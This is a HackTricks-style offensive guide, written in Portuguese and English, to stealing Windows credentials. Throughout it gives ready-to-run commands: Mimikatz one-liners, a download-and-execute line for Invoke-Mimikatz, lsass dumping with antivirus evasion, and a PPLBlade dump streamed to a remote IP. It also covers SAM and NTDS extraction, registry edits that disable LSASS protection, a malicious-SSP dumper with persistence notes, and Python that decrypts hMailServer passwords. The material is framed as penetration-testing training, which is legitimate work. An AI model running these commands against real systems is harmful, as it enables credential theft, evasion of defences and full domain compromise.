# Roubo de Credenciais do Windows

{{#include ../../banners/hacktricks-training.md}}

## Credenciais Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Encontre outras coisas que Mimikatz pode fazer em** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Saiba sobre algumas possíveis proteções para credentials aqui.**](credentials-protections.md) **Essas proteções podem impedir o Mimikatz de extrair algumas credentials.**

## Credentials with Meterpreter

Use o [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que** eu criei para **procurar passwords and hashes** dentro da vítima.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Contornando AV

### Procdump + Mimikatz

Como **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)** é uma ferramenta legítima da Microsoft**, não é detectado pelo Defender.\
Você pode usar esta ferramenta para **dump the lsass process**, **download the dump** e **extract** as **credentials locally** do dump.

Você também pode usar [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Este processo é realizado automaticamente com [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Alguns **AV** podem **detectar** como **malicioso** o uso de **procdump.exe to dump lsass.exe**, isso ocorre porque eles estão **detectando** a string **"procdump.exe" and "lsass.exe"**. Portanto é mais **discreto** **passar** como **argumento** o **PID** de lsass.exe para procdump **em vez do** **nome lsass.exe.**

### Dumping lsass with **comsvcs.dll**

A DLL chamada **comsvcs.dll** encontrada em `C:\Windows\System32` é responsável por **dumping process memory** no caso de uma falha. Esta DLL inclui uma **função** chamada **`MiniDumpW`**, projetada para ser invocada usando `rundll32.exe`.\
Não importa o uso dos dois primeiros argumentos, mas o terceiro é dividido em três componentes. O ID do processo a ser dumpado constitui o primeiro componente, a localização do arquivo de dump representa o segundo, e o terceiro componente é estritamente a palavra **full**. Não existem opções alternativas.\
Ao analisar esses três componentes, a DLL passa a criar o arquivo de dump e a transferir a memória do processo especificado para esse arquivo.\
A utilização da **comsvcs.dll** é viável para dumping the lsass process, eliminando assim a necessidade de fazer upload e executar procdump. Este método é descrito em detalhe em [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

O comando a seguir é usado para a execução:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Você pode automatizar esse processo com** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass with Task Manager**

1. Clique com o botão direito na Task Bar e clique em Task Manager
2. Clique em More details
3. Procure por "Local Security Authority Process" na aba Processes
4. Clique com o botão direito em "Local Security Authority Process" e clique em "Create dump file".

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) é um binário assinado pela Microsoft que faz parte da suíte [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) é uma Protected Process Dumper Tool que suporta ofuscar memory dump e transferi-los para estações de trabalho remotas sem gravá-los no disco.

**Funcionalidades principais**:

1. Contornar a proteção PPL
2. Ofuscar memory dump files para evitar mecanismos de detecção baseados em assinatura do Defender
3. Enviar memory dump usando métodos de upload RAW e SMB sem gravá‑los no disco (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon distribui um dumper em três estágios chamado **LalsDumper** que nunca chama `MiniDumpWriteDump`, portanto EDR hooks nessa API nunca disparam:

1. **Stage 1 loader (`lals.exe`)** – busca em `fdp.dll` um placeholder composto por 32 caracteres `d` minúsculos, sobrescreve-o com o caminho absoluto para `rtu.txt`, salva a DLL patchada como `nfdp.dll`, e chama `AddSecurityPackageA("nfdp","fdp")`. Isso força **LSASS** a carregar a DLL maliciosa como um novo Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – quando LSASS carrega `nfdp.dll`, a DLL lê `rtu.txt`, aplica XOR em cada byte com `0x20`, e mapeia o blob decodificado na memória antes de transferir a execução.
3. **Stage 3 dumper** – o payload mapeado reimplementa a lógica do MiniDump usando **direct syscalls** resolvidos a partir de nomes de API hashed (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Um export dedicado chamado `Tom` abre `%TEMP%\<pid>.ddt`, grava um dump comprimido do LSASS no arquivo e fecha o handle para que a exfiltração possa acontecer depois.

Operator notes:

* Keep `lals.exe`, `fdp.dll`, `nfdp.dll`, and `rtu.txt` in the same directory. Stage 1 rewrites the hard-coded placeholder with the absolute path to `rtu.txt`, so splitting them breaks the chain.
* Registration happens by appending `nfdp` to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. You can seed that value yourself to make LSASS reload the SSP every boot.
* `%TEMP%\*.ddt` files are compressed dumps. Decompress locally, then feed them to Mimikatz/Volatility for credential extraction.
* Running `lals.exe` requires admin/SeTcb rights so `AddSecurityPackageA` succeeds; once the call returns, LSASS transparently loads the rogue SSP and executes Stage 2.
* Removing the DLL from disk does not evict it from LSASS. Either delete the registry entry and restart LSASS (reboot) or leave it for long-term persistence.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump do NTDS.dit do DC alvo
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Extrair o histórico de senhas do NTDS.dit do DC alvo
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Mostrar o atributo pwdLastSet para cada conta do NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Esses arquivos devem estar **localizados** em _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM_. Mas **você não pode simplesmente copiá-los de maneira regular** porque eles são protegidos.

### Do Registro

A maneira mais fácil de roubar esses arquivos é obter uma cópia a partir do registro:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Baixe** esses arquivos para sua máquina Kali e **extraia os hashes** usando:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Você pode copiar arquivos protegidos usando este serviço. É necessário ser Administrador.

#### Using vssadmin

O binário vssadmin está disponível apenas em versões do Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Mas você pode fazer o mesmo a partir do **Powershell**. Este é um exemplo de **como copiar o SAM file** (a unidade usada é "C:" e ele é salvo em C:\users\Public), mas você pode usar isso para copiar qualquer arquivo protegido:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Código do livro: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Finalmente, você também pode usar o [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) para fazer uma cópia do SAM, SYSTEM e ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Credenciais do Active Directory - NTDS.dit**

O arquivo **NTDS.dit** é conhecido como o coração do **Active Directory**, contendo dados cruciais sobre objetos de usuário, grupos e suas memberships. É onde os **password hashes** dos usuários de domínio são armazenados. Este arquivo é um banco de dados **Extensible Storage Engine (ESE)** e reside em **_%SystemRoom%/NTDS/ntds.dit_**.

Dentro deste banco de dados, três tabelas principais são mantidas:

- **Data Table**: Esta tabela é responsável por armazenar detalhes sobre objetos como usuários e grupos.
- **Link Table**: Mantém o rastreamento dos relacionamentos, como memberships de grupos.
- **SD Table**: **Descritores de segurança** para cada objeto são mantidos aqui, garantindo a segurança e o controle de acesso dos objetos armazenados.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

O Windows usa _Ntdsa.dll_ para interagir com esse arquivo e ele é usado por _lsass.exe_. Então, **parte** do arquivo **NTDS.dit** pode estar localizada **dentro da memória do `lsass`** (você pode encontrar os dados mais recentemente acessados, provavelmente por causa da melhora de desempenho ao usar uma **cache**).

#### Descriptografando os hashes dentro do NTDS.dit

O hash é cifrado 3 vezes:

1. Descriptografar o Password Encryption Key (**PEK**) usando a **BOOTKEY** e **RC4**.
2. Descriptografar o **hash** usando **PEK** e **RC4**.
3. Descriptografar o **hash** usando **DES**.

**PEK** tem o **mesmo valor** em **todos os controladores de domínio**, mas ele é **cifrado** dentro do arquivo **NTDS.dit** usando a **BOOTKEY** do arquivo **SYSTEM** do controlador de domínio (é diferente entre controladores de domínio). É por isso que, para obter as credenciais do arquivo **NTDS.dit**, **você precisa dos arquivos NTDS.dit e SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copiando NTDS.dit usando Ntdsutil

Available since Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Você também pode usar o [**volume shadow copy**](#stealing-sam-and-system) trick para copiar o **ntds.dit** arquivo. Lembre-se de que você também precisará de uma cópia do **SYSTEM arquivo** (novamente, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trick).

### **Extraindo hashes do NTDS.dit**

Depois de **obter** os arquivos **NTDS.dit** e **SYSTEM**, você pode usar ferramentas como _secretsdump.py_ para **extrair os hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Você também pode **extraí-los automaticamente** usando um domain admin user válido:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Para **arquivos NTDS.dit grandes**, recomenda-se extraí-los usando [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Por fim, você também pode usar o **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ ou o **mimikatz** `lsadump::lsa /inject`

### **Extraindo objetos de domínio de NTDS.dit para um banco de dados SQLite**

Os objetos do NTDS podem ser extraídos para um banco de dados SQLite com [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Não apenas secrets são extraídos, mas também os objetos inteiros e seus atributos, permitindo a extração adicional de informações quando o arquivo bruto NTDS.dit já foi recuperado.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
O hive `SYSTEM` é opcional, mas permite a decriptação de segredos (NT & LM hashes, credenciais suplementares como senhas em texto claro, chaves kerberos ou de trust, históricos de senhas NT & LM). Junto com outras informações, os seguintes dados são extraídos: contas de usuário e máquina com seus hashes, flags UAC, timestamp do último logon e alteração de senha, descrição das contas, nomes, UPN, SPN, grupos e afiliações recursivas, árvore de unidades organizacionais e filiação, domínios confiáveis com tipo de trust, direção e atributos...

## Lazagne

Faça o download do binário de [here](https://github.com/AlessandroZ/LaZagne/releases). Você pode usar esse binário para extrair credenciais de vários softwares.
```
lazagne.exe all
```
## Outras ferramentas para extrair credenciais do SAM e LSASS

### Windows credentials Editor (WCE)

Esta ferramenta pode ser usada para extrair credenciais da memória. Faça o download em: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrai credenciais do arquivo SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extrair credenciais do arquivo SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Faça o download em:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) e apenas **execute-o** e as senhas serão extraídas.

## Mining idle RDP sessions and weakening security controls

Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose techniques are handy for any red-teamer:

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – analise cada hive de usuário em `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Cada subchave armazena o nome do servidor, `UsernameHint`, e o timestamp da última gravação. Você pode replicar a lógica do FinalDraft com PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – consulte o log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` pelos Event IDs **21** (successful logon) e **25** (disconnect) para mapear quem administrou a máquina:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Once you know which Domain Admin regularly connects, dump LSASS (with LalsDumper/Mimikatz) while their **disconnected** session still exists. CredSSP + NTLM fallback leaves their verifier and tokens in LSASS, which can then be replayed over SMB/WinRM to grab `NTDS.dit` or stage persistence on domain controllers.

### Registry downgrades targeted by FinalDraft

The same implant also tampers with several registry keys to make credential theft easier:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Setting `DisableRestrictedAdmin=1` força a reutilização completa de credenciais/tickets durante RDP, permitindo pivôs no estilo pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` desabilita a filtragem de token do UAC para que administradores locais obtenham tokens sem restrições pela rede.
* `DSRMAdminLogonBehavior=2` permite que o administrador DSRM faça logon enquanto o DC está online, dando aos atacantes outra conta integrada de alto privilégio.
* `RunAsPPL=0` remove as proteções PPL do LSASS, tornando o acesso à memória trivial para dumpers como LalsDumper.

## hMailServer database credentials (post-compromise)

hMailServer armazena a senha do banco de dados em `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` sob `[Database] Password=`. O valor é Blowfish-encrypted com a chave estática `THIS_KEY_IS_NOT_SECRET` e trocas de endianness em palavras de 4 bytes. Use a string hexadecimal do INI com este trecho Python:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Com a senha em texto claro, copie o banco de dados SQL CE para evitar bloqueios de arquivos, carregue o provedor de 32 bits e atualize se necessário antes de consultar os hashes:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
A coluna `accountpassword` usa o formato de hash do hMailServer (hashcat mode `1421`). A quebra desses valores pode fornecer credenciais reutilizáveis para pivots WinRM/SSH.
## Referências

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
